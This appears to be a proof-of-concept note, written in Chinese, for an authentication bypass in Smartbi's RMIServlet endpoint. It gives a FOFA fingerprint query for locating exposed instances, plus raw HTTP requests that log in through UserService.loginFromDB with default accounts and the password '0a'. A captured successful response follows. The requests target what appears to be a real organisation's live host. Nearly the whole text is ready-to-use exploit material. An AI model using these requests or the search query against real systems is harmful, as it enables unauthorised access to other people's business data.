# Smartbi smartbivisionRMIServlet 接口权限绕过漏洞

    ## fofa

```
body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
```



## poc

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: bi.diousgroup.com.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 67

className=UserService&methodName=loginFromDB¶ms=["public","0a"]
```



```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: bi.diousgroup.com.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 68

className=UserService&methodName=loginFromDB¶ms=["service","0a"]


HTTP/1.1 200 
Server: nginx
Date: Mon, 14 Aug 2023 07:18:54 GMT
Content-Type: text/html;charset=UTF-8
Connection: keep-alive
Set-Cookie: JSESSIONID=BAB0A878DD91CB2DD9F669F21B28157D; Path=/smartbi; HttpOnly
Content-Length: 40

{"retCode":0,"result":true,"duration":3}
```
